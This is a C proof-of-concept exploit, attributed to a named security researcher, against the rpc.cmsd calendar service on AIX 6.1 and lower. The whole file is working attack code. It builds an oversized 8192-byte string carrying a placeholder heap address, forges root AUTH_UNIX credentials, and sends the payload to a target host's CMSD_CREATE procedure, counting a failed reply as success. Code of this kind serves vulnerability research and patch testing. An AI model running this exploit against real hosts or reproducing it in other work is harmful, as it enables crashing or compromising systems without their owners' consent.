/*
 * Rodrigo Rubira Branco (BSDaemon) - < rodrigo *noSPAM* risesecurity . org >
 * http://www.kernelhacking.com/rodrigo
 * http://www.risesecurity.org
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <rpc/rpc.h>

#define CMSD_PROG 100068
#define CMSD_VERS 4
#define CMSD_CREATE 21


struct cm_send {
   char *s1;
   char *s2;
};

struct cm_reply {
   int i;
};

bool_t xdr_cm_send(XDR *xdrs, struct cm_send *objp)
{
   if(!xdr_wrapstring(xdrs, &objp->s1))
      return (FALSE);
   if(!xdr_wrapstring(xdrs, &objp->s2))
       return (FALSE);

   return (TRUE);
}

bool_t xdr_cm_reply(XDR *xdrs, struct cm_reply *objp)
{
   if(!xdr_int(xdrs, &objp->i))
      return (FALSE);
   return (TRUE);
}

int
main(int argc, char *argv[])
{
   char buffer[8192];
   long ret, offset;
   int len, x, y, i;
   char *hostname, *b;

   CLIENT *cl;
   struct cm_send send;
   struct cm_reply reply;
   struct timeval tm = { 10, 0 };
   enum clnt_stat stat;

   if(argc < 2) {
      printf("<< RPC.cmsd remote PoC for AIX 6.1 and lower! >>\n");
      printf("<< Rodrigo Rubira Branco (BSDaemon) - <rodrigo *noSPAM* kernelhacking .com> >>\n");
      printf("<< http://www.kernelhacking.com/rodrigo >>\n");
      printf("<< http://www.risesecurity.org >>\n");
      printf("Usage: %s [hostname]\n", argv[0]);
      exit(1);
   }

   hostname = argv[1];

   memset(buffer,0x60,sizeof(buffer)-1);
   memcpy(buffer+4104,"\xde\xad\xbe\xef",4); //0x20034748 heap

   send.s1 = buffer;
   send.s2 = "";

   printf("Calling vulnerable procedure ... ");

   cl = clnt_create(hostname, CMSD_PROG, CMSD_VERS, "udp");
   if(cl == NULL) {
      clnt_pcreateerror("clnt_create");
      printf("exploit failed; unable to contact RPC server\n");
      exit(1);
   }

   cl->cl_auth = authunix_create("localhost", 0, 0, 0, NULL);
   stat = clnt_call(cl, CMSD_CREATE, xdr_cm_send, (caddr_t) &send,
                        xdr_cm_reply, (caddr_t) &reply, tm);

   if(stat == RPC_SUCCESS) {
      printf("not vuln!!\n");
      clnt_destroy(cl);
      exit(1);
   } else {
      printf("done!\n");
      clnt_destroy(cl);
      exit(0);
   }
}

